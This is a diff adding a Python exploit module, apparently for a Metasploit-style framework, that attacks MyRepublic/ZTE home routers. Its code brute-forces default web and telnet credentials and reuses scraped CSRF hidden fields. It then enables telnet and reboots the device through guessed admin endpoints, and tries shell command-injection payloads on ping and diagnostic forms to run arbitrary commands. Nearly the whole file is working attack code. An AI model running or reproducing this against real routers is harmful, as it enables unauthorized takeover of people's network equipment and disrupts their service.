@@ -1,0 +1,645 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+MyRepublic Router Multi-Exploit Module
+CSRF Token + Login + Telnet + RCE
+"""
+
+import requests
+import socket
+import time
+import re
+from pathlib import Path
+
+try:
+    from rich.console import Console
+    from rich.table import Table
+    from rich.panel import Panel
+    from rich.syntax import Syntax
+    console = Console()
+except ImportError:
+    class SimpleConsole:
+        def print(self, msg): 
+            print(msg)
+    console = SimpleConsole()
+
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+MODULE_INFO = {
+    "name": "MyRepublic Router Multi-Exploit",
+    "description": "CSRF Token → Login → Telnet → RCE",
+    "author": "Lazy Framework Team",
+    "license": "MIT",
+    "platform": "linux",
+    "arch": "arm,mips",
+    "rank": "Excellent",
+    "references": ["MyRepublic ONT", "ZTE F609/F660", "CSRF Bypass"]
+}
+
+OPTIONS = {
+    "RHOST": {"description": "Target IP", "required": True, "default": "192.168.1.1"},
+    "RPORT": {"description": "Web port", "required": False, "default": "80"},
+    "PROTO": {"description": "HTTP protocol", "required": False, "default": "http", "choices": ["http", "https"]},
+    "USERNAME": {"description": "Username", "required": False, "default": "user"},
+    "PASSWORD": {"description": "Password", "required": False, "default": "user1234"},
+    "MODE": {
+        "description": "Exploit mode",
+        "required": False,
+        "default": "detect",
+        "choices": ["detect", "login", "telnet", "rce", "full"]
+    },
+    "CMD": {"description": "Command", "required": False, "default": "id"},
+    "TELNET_PORT": {"description": "Telnet port", "required": False, "default": "23"},
+}
+
+class MyRepublicExploit:
+    def __init__(self, target, port=80, proto="http", username="user", password="user1234", cmd="id", telnet_port=23):
+        self.target = target
+        self.port = port
+        self.proto = proto
+        self.username = username
+        self.password = password
+        self.cmd = cmd
+        self.telnet_port = telnet_port
+        self.base_url = f"{proto}://{target}:{port}"
+        self.session = requests.Session()
+        if proto == "https":
+            self.session.verify = False
+        self.session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive',
+        })
+        self.logged_in = False
+
+    # ===================================================================
+    # DETEKSI DEVICE
+    # ===================================================================
+    def detect_device(self):
+        console.print("\n[bold yellow]======== DEVICE DETECTION ========[/bold yellow]")
+        
+        try:
+            r = self.session.get(f"{self.base_url}/", timeout=10)
+            html = r.text.lower()
+            
+            # Cek signature MyRepublic/ZTE
+            signatures = ["myrepublic", "zte", "f609", "f660", "hg8245", "ont", "rompager"]
+            found_signatures = [sig for sig in signatures if sig in html]
+            
+            if found_signatures:
+                console.print(f"[green]✓ MyRepublic/ZTE router detected: {', '.join(found_signatures)}[/green]")
+                return True
+            else:
+                console.print("[yellow]? Unknown router type[/yellow]")
+                return True
+                
+        except Exception as e:
+            console.print(f"[red]Detection error: {e}[/red]")
+            return False
+
+    # ===================================================================
+    # LOGIN DENGAN CSRF TOKEN - FIXED
+    # ===================================================================
+    def try_login(self):
+        if self.logged_in:
+            return True
+
+        console.print("[bold yellow][*] Attempting login with CSRF token...[/bold yellow]")
+        
+        # Coba credentials yang umum
+        credentials = [
+            ("user", "user1234"),
+            ("admin", "admin"),
+            ("user", "user"),
+            ("admin", "password"),
+            ("root", "root"),
+            ("admin", "zte"),
+            ("support", "support")
+        ]
+
+        for username, password in credentials:
+            console.print(f"[cyan]Trying: {username}:{password}[/cyan]")
+            
+            try:
+                # Ambil halaman login untuk dapat CSRF token
+                login_url = f"{self.base_url}/login.html"
+                
+                console.print(f"[dim]Fetching login page: {login_url}[/dim]")
+                r = self.session.get(login_url, timeout=10)
+                
+                if r.status_code != 200:
+                    console.print(f"[red]Cannot access login page (HTTP {r.status_code})[/red]")
+                    continue
+
+                # Extract semua hidden fields (CSRF tokens)
+                hidden_fields = {}
+                for match in re.finditer(r'<input[^>]+type=["\']hidden["\'][^>]*>', r.text, re.I):
+                    name_match = re.search(r'name=["\']([^"\']+)["\']', match.group(0))
+                    value_match = re.search(r'value=["\']([^"\']*)["\']', match.group(0))
+                    if name_match:
+                        field_name = name_match.group(1)
+                        field_value = value_match.group(1) if value_match else ""
+                        hidden_fields[field_name] = field_value
+
+                console.print(f"[dim]Found hidden fields: {list(hidden_fields.keys())}[/dim]")
+
+                # Coba berbagai kombinasi parameter login - FIXED
+                login_attempts = [
+                    {"username": username, "password": password},
+                    {"user": username, "pwd": password},
+                    {"usr": username, "pass": password},
+                    {"login_name": username, "login_pass": password},
+                    {"name": username, "passwd": password},
+                    {"UserName": username, "Password": password},
+                    {"userid": username, "password": password}
+                ]
+
+                for login_params in login_attempts:
+                    # Gabungkan dengan hidden fields (CSRF tokens)
+                    payload = login_params.copy()
+                    payload.update(hidden_fields)
+                    
+                    # Tambahkan submit button jika belum ada
+                    if "submit" not in payload and "Submit" not in payload:
+                        payload["submit"] = "Login"
+
+                    # Hide password in log - FIXED
+                    safe_payload = {}
+                    for k, v in payload.items():
+                        if any(pass_key in k.lower() for pass_key in ['pass', 'pwd']):
+                            safe_payload[k] = '***'
+                        else:
+                            safe_payload[k] = v
+                    
+                    console.print(f"[dim]Sending payload: {safe_payload}[/dim]")
+
+                    r_post = self.session.post(login_url, data=payload, timeout=10, allow_redirects=True)
+                    
+                    # Cek indicators of successful login
+                    success = False
+                    
+                    # Indicator 1: Redirect ke halaman non-login
+                    if r_post.status_code in [200, 302]:
+                        if "login" not in r_post.url.lower() and r_post.url != login_url:
+                            success = True
+                    
+                    # Indicator 2: Ada tombol/logout text
+                    if "logout" in r_post.text.lower():
+                        success = True
+                    
+                    # Indicator 3: Ada status/dashboard tanpa login form
+                    if any(x in r_post.text.lower() for x in ["status", "dashboard", "welcome", "main"]):
+                        if "login" not in r_post.text.lower() and "password" not in r_post.text.lower():
+                            success = True
+                    
+                    # Indicator 4: Session cookies
+                    if self.session.cookies and len(self.session.cookies) > 0:
+                        success = True
+                        
+                    # Indicator 5: Response mengandung success message
+                    if any(x in r_post.text.lower() for x in ["success", "welcome", "logged in"]):
+                        success = True
+
+                    if success:
+                        self.logged_in = True
+                        self.username = username
+                        self.password = password
+                        console.print(Panel(
+                            f"[bold green]LOGIN SUCCESS![/bold green]\n"
+                            f"Username: {username}\n"
+                            f"Password: {password}\n"
+                            f"Redirected to: {r_post.url}",
+                            border_style="green"
+                        ))
+                        return True
+                        
+            except Exception as e:
+                console.print(f"[red]Login error with {username}: {e}[/red]")
+                continue
+
+        console.print(Panel(
+            "[red]All login attempts failed[/red]",
+            border_style="red"
+        ))
+        return False
+
+    # ===================================================================
+    # CEK TELNET PORT
+    # ===================================================================
+    def check_telnet(self):
+        """Cek apakah telnet port terbuka"""
+        console.print("[bold yellow][*] Checking Telnet port...[/bold yellow]")
+        
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((self.target, self.telnet_port))
+            sock.close()
+            
+            if result == 0:
+                console.print("[green]✓ Telnet port is OPEN[/green]")
+                return True
+            else:
+                console.print("[red]✗ Telnet port is CLOSED[/red]")
+                return False
+                
+        except Exception as e:
+            console.print(f"[red]Telnet check error: {e}[/red]")
+            return False
+
+    # ===================================================================
+    # ENABLE TELNET
+    # ===================================================================
+    def enable_telnet(self):
+        """Enable telnet service"""
+        if not self.logged_in:
+            console.print("[red]Need login first to enable telnet[/red]")
+            return False
+
+        console.print(Panel(
+            "[bold yellow]ENABLING TELNET SERVICE[/bold yellow]",
+            border_style="yellow"
+        ))
+        
+        # Endpoints untuk enable telnet
+        endpoints = [
+            "/goform/formTelnet",
+            "/cgi-bin/luci/admin/telnet",
+            "/api/telnet/enable",
+            "/goform/telnet"
+        ]
+        
+        # Payloads untuk enable telnet
+        payloads = [
+            {"telnetd_enable": "1", "save": "Apply"},
+            {"enable": "1", "telnet": "on"},
+            {"status": "1", "action": "enable"}
+        ]
+        
+        for endpoint in endpoints:
+            for data in payloads:
+                try:
+                    url = f"{self.base_url}{endpoint}"
+                    console.print(f"[cyan]Trying: {endpoint}[/cyan]")
+                    
+                    r = self.session.post(url, data=data, timeout=10)
+                    
+                    if r.status_code == 200:
+                        console.print(f"[green]✓ Telnet enable request sent to {endpoint}[/green]")
+                        
+                        # Coba reboot router
+                        if self.reboot_router():
+                            return True
+                        else:
+                            console.print("[yellow]Telnet enabled but reboot may be required manually[/yellow]")
+                            return True
+                            
+                except Exception as e:
+                    console.print(f"[red]Error with {endpoint}: {e}[/red]")
+                    continue
+        
+        console.print("[red]Failed to enable telnet on all endpoints[/red]")
+        return False
+
+    def reboot_router(self):
+        """Reboot router untuk apply changes"""
+        console.print("[yellow][*] Attempting to reboot router...[/yellow]")
+        
+        reboot_endpoints = [
+            "/goform/formReboot",
+            "/cgi-bin/luci/admin/reboot",
+            "/api/system/reboot"
+        ]
+        
+        for endpoint in reboot_endpoints:
+            try:
+                url = f"{self.base_url}{endpoint}"
+                data = {"reboot": "1", "submit": "Reboot"}
+                
+                console.print(f"[dim]Trying reboot: {endpoint}[/dim]")
+                r = self.session.post(url, data=data, timeout=10)
+                
+                if r.status_code == 200:
+                    console.print(Panel(
+                        "[bold red]ROUTER REBOOTING![/bold red]\n"
+                        "Waiting 60 seconds for router to come back online...",
+                        border_style="red"
+                    ))
+                    time.sleep(60)
+                    return True
+                    
+            except Exception as e:
+                continue
+        
+        console.print("[yellow]Reboot command may have failed - waiting 30s anyway[/yellow]")
+        time.sleep(30)
+        return True
+
+    # ===================================================================
+    # TELNET CONNECTION
+    # ===================================================================
+    def wait_for_telnet(self, timeout=60):
+        """Tunggu telnet port terbuka"""
+        console.print(f"[bold yellow]Waiting up to {timeout}s for Telnet port {self.telnet_port}...[/bold yellow]")
+        
+        for i in range(timeout):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(2)
+                result = sock.connect_ex((self.target, self.telnet_port))
+                sock.close()
+                
+                if result == 0:
+                    console.print(f"[bold green]✓ Telnet port OPEN after {i+1}s[/bold green]")
+                    return True
+                    
+            except:
+                pass
+            
+            # Juga cek HTTP untuk tahu kapan router online
+            if i % 5 == 0:
+                try:
+                    self.session.get(f"{self.base_url}/", timeout=5)
+                except:
+                    pass
+            
+            time.sleep(1)
+            if i % 10 == 0 and i > 0:
+                console.print(f"[yellow]Still waiting... ({i}s)[/yellow]")
+        
+        console.print("[red]✗ Telnet port never opened[/red]")
+        return False
+
+    def connect_telnet(self):
+        """Connect ke telnet service"""
+        if not self.wait_for_telnet(timeout=60):
+            return False
+
+        console.print(Panel(
+            "[bold yellow]CONNECTING TO TELNET[/bold yellow]",
+            border_style="yellow"
+        ))
+        
+        # Credentials untuk telnet
+        telnet_creds = [
+            ("user", "user1234"),
+            ("admin", "admin"),
+            ("root", "root"),
+            ("admin", "zte"),
+            ("support", "support")
+        ]
+
+        for username, password in telnet_creds:
+            console.print(f"[cyan]Trying telnet: {username}:{password}[/cyan]")
+            
+            try:
+                # Buat socket connection
+                tn = socket.socket()
+                tn.settimeout(10)
+                tn.connect((self.target, self.telnet_port))
+                
+                # Tunggu dan baca banner
+                time.sleep(2)
+                try:
+                    banner = tn.recv(1024).decode(errors='ignore')
+                    console.print(f"[dim]Telnet banner: {banner[:100]}...[/dim]")
+                except:
+                    pass
+                
+                # Login process
+                tn.send(f"{username}\n".encode())
+                time.sleep(1)
+                tn.send(f"{password}\n".encode())
+                time.sleep(2)
+                
+                # Test commands
+                tn.send(b"id\n")
+                time.sleep(2)
+                tn.send(b"uname -a\n")
+                time.sleep(2)
+                tn.send(b"pwd\n")
+                time.sleep(2)
+                
+                # Baca output
+                output = b""
+                for _ in range(10):
+                    try:
+                        data = tn.recv(4096)
+                        if not data:
+                            break
+                        output += data
+                    except:
+                        break
+                
+                output_text = output.decode(errors='ignore')
+                
+                # Cek jika login successful
+                if any(x in output_text for x in ["uid=", "root", "Linux", "#", "$"]):
+                    console.print(Panel(
+                        f"[bold green]TELNET SHELL GAINED![/bold green]\n"
+                        f"Credentials: {username}:{password}",
+                        border_style="green"
+                    ))
+                    show_output(output_text)
+                    tn.close()
+                    return True
+                    
+                tn.close()
+                
+            except Exception as e:
+                console.print(f"[red]Telnet failed with {username}: {e}[/red]")
+                continue
+
+        console.print("[red]All Telnet credentials failed[/red]")
+        return False
+
+    # ===================================================================
+    # RCE EXPLOITATION
+    # ===================================================================
+    def exploit_rce(self):
+        """Remote Code Execution"""
+        if not self.logged_in:
+            console.print("[red]Need login first for RCE[/red]")
+            return False
+
+        console.print(Panel(
+            "[bold yellow]ATTEMPTING REMOTE CODE EXECUTION[/bold yellow]",
+            border_style="yellow"
+        ))
+        
+        # Endpoints untuk RCE
+        endpoints = [
+            ("/goform/formPing", "ping_address"),
+            ("/cgi-bin/luci/admin/network/diagnostic", "ping_address"),
+            ("/api/network/ping", "host"),
+            ("/cgi-bin/ping.cgi", "ping_address"),
+            ("/goform/diagnostic", "command")
+        ]
+        
+        # Command injection payloads
+        payloads = [
+            f"127.0.0.1; {self.cmd}",
+            f"127.0.0.1 && {self.cmd}",
+            f"127.0.0.1 | {self.cmd}",
+            f"`{self.cmd}`",
+            f"$({self.cmd})",
+            f";{self.cmd};"
+        ]
+        
+        for endpoint, param in endpoints:
+            for payload in payloads:
+                try:
+                    url = f"{self.base_url}{endpoint}"
+                    data = {param: payload}
+                    
+                    console.print(f"[dim]Trying: {endpoint} with {payload}[/dim]")
+                    r = self.session.post(url, data=data, timeout=10)
+                    
+                    # Cek indicators of successful RCE
+                    if any(x in r.text for x in ["uid=", "root", "bin/", "www-data"]):
+                        console.print(Panel(
+                            f"[bold green]RCE SUCCESS![/bold green]\n"
+                            f"Endpoint: {endpoint}\n"
+                            f"Payload: {payload}",
+                            border_style="green"
+                        ))
+                        show_output(r.text.strip())
+                        return True
+                        
+                except Exception as e:
+                    continue
+        
+        console.print("[red]All RCE attempts failed[/red]")
+        return False
+
+# ===================================================================
+# DISPLAY FUNCTIONS
+# ===================================================================
+def show_info():
+    table = Table(show_header=False, box=None)
+    table.add_column("Field", style="bold yellow")
+    table.add_column("Value", style="white")
+    table.add_row("Name", MODULE_INFO["name"])
+    table.add_row("Feature", "CSRF Token + Login + Telnet + RCE")
+    table.add_row("Risk", "High")
+    console.print(Panel(table, title="MyRepublic Exploit", border_style="red"))
+
+def show_options(opts):
+    table = Table(title="Options", box=None)
+    table.add_column("Name", style="bold cyan")
+    table.add_column("Value", style="green")
+    table.add_column("Req", style="yellow")
+    table.add_column("Desc", style="white")
+    for k, v in opts.items():
+        val = v.get('value', v.get('default', ''))
+        req = "yes" if v.get('required') else "no"
+        table.add_row(k, str(val), req, v.get('description', ''))
+    console.print(Panel(table, border_style="blue"))
+
+def show_output(text):
+    if text and text.strip():
+        syntax = Syntax(text.strip(), "bash", theme="monokai", line_numbers=True)
+        console.print(Panel(syntax, title="Command Output", border_style="green"))
+
+# ===================================================================
+# MAIN EXECUTION
+# ===================================================================
+def run(session, options):
+    show_info()
+    current = {k: {**v, 'value': options.get(k, v.get('default'))} for k, v in OPTIONS.items()}
+    show_options(current)
+
+    rhost = options.get("RHOST", "192.168.1.1")
+    rport = options.get("RPORT", "80")
+    proto = options.get("PROTO", "http")
+    mode = options.get("MODE", "detect").lower()
+    cmd = options.get("CMD", "id")
+    telnet_port = int(options.get("TELNET_PORT", "23"))
+
+    console.print(f"\n[bold yellow][*] Target: {proto}://{rhost}:{rport}[/bold yellow]")
+    console.print(f"[bold yellow][*] Mode: {mode.upper()}[/bold yellow]")
+
+    try:
+        exploit = MyRepublicExploit(rhost, rport, proto, cmd=cmd, telnet_port=telnet_port)
+
+        # Step 1: Device Detection
+        if not exploit.detect_device():
+            console.print("[red]Target not reachable or not a MyRepublic router[/red]")
+            return False
+
+        # Step 2: Mode Execution
+        if mode == "detect":
+            console.print("\n[bold green]✓ Detection completed[/bold green]")
+            return True
+            
+        elif mode == "login":
+            if exploit.try_login():
+                console.print("\n[bold green]✓ Login successful[/bold green]")
+                return True
+            else:
+                console.print("\n[bold red]✗ Login failed[/bold red]")
+                return False
+                
+        elif mode == "telnet":
+            console.print("\n[bold yellow]=== TELNET EXPLOITATION ===[/bold yellow]")
+            if exploit.try_login():
+                exploit.enable_telnet()
+                if exploit.connect_telnet():
+                    console.print("\n[bold green]✓ Telnet exploitation successful[/bold green]")
+                    return True
+                else:
+                    console.print("\n[bold red]✗ Telnet failed[/bold red]")
+                    return False
+            else:
+                console.print("[red]✗ Login required for telnet[/red]")
+                return False
+                
+        elif mode == "rce":
+            console.print("\n[bold yellow]=== RCE EXPLOITATION ===[/bold yellow]")
+            if exploit.try_login():
+                if exploit.exploit_rce():
+                    console.print("\n[bold green]✓ RCE exploitation successful[/bold green]")
+                    return True
+                else:
+                    console.print("\n[bold red]✗ RCE failed[/bold red]")
+                    return False
+            else:
+                console.print("[red]✗ Login required for RCE[/red]")
+                return False
+                
+        elif mode == "full":
+            console.print("\n[bold yellow]=== FULL EXPLOITATION ===[/bold yellow]")
+            
+            # Step 1: Login
+            console.print("[cyan][*] Step 1: Authentication[/cyan]")
+            if exploit.try_login():
+                console.print("[green]✓ Login successful[/green]")
+                
+                # Step 2: Telnet
+                console.print("[cyan][*] Step 2: Telnet Access[/cyan]")
+                exploit.enable_telnet()
+                telnet_success = exploit.connect_telnet()
+                
+                # Step 3: RCE
+                console.print("[cyan][*] Step 3: Remote Code Execution[/cyan]")
+                rce_success = exploit.exploit_rce()
+                
+                if telnet_success or rce_success:
+                    console.print("\n[bold green]✓ Full exploitation completed successfully![/bold green]")
+                    return True
+                else:
+                    console.print("\n[bold yellow]! Partial success - some exploits failed[/bold yellow]")
+                    return True
+            else:
+                console.print("[red]✗ Login failed - stopping exploitation[/red]")
+                return False
+
+        console.print(f"\n[bold green]✓ {mode.upper()} mode completed![/bold green]")
+        return True
+
+    except Exception as e:
+        console.print(f"[bold red][-] Error: {str(e)}[/bold red]")
+        return False
